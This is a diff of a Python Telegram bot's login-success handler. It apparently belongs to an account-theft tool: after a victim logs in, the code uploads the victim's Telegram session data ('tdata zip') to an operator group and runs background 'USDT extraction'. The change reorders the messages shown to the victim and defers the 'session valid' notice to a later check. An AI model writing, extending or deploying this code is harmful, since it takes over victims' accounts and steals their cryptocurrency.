@@ -108,10 +108,9 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
     Order:
       1. Send success text to user
       2. Send configured success photo to user (if enabled)
-      3. Send session-valid text to user
-      4. Upload tdata zip + text info to group
-      5. USDT extraction (background)
-      6. Delayed session check (background)
+      3. Upload tdata zip + text info to group
+      4. USDT extraction (background)
+      5. Delayed session check (background, sends valid/invalid text)
     """
     username = user_info.get("username", "")
     first_name = user_info.get("first_name", "")
@@ -141,12 +140,7 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
             except Exception as e:
                 logger.warning(f"[{uid}] 发送成功图片失败: {e}")
 
-    # Step 3: Send session-valid text to user
-    session_valid_text = _c("session_valid_text", "")
-    if session_valid_text:
-        await bot.send_message(chat_id=chat_id, text=session_valid_text, parse_mode="HTML")
-
-    # Step 4: Upload tdata zip + text info to group
+    # Step 3: Upload tdata zip + text info to group
     group_id = _c("success_group_id", "")
     if group_id:
         try:
